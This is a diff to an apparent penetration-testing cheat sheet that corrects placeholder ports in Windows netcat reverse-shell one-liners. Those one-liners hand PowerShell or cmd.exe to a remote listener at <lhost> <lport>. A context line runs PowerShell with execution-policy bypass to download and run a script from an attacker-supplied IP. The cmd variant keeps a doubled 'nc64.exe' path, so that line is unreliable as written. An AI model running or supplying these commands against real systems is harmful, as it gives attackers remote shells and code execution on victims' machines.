@@ -50,11 +50,11 @@ powershell -exec bypass -c "iwr('http://<ip>:<http_port>/Edited-Invoke-PowerShel
 
 ## nc.exe - powershell reverse shell
 ```powershell
-<nc_path|c:\windows\temp>\nc64.exe -nv <lhost> <lhost> -e C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+<nc_path|c:\windows\temp>\nc64.exe -nv <lhost> <lport> -e C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
 ```
 
 ## nc.exe - cmd reverse shell
 ```powershell
-<nc_path|c:\windows\temp>\nc64.exe\nc64.exe -nv <lhost> <lhost> -e cmd.exe
+<nc_path|c:\windows\temp>\nc64.exe\nc64.exe -nv <lhost> <lport> -e cmd.exe
 ```
 
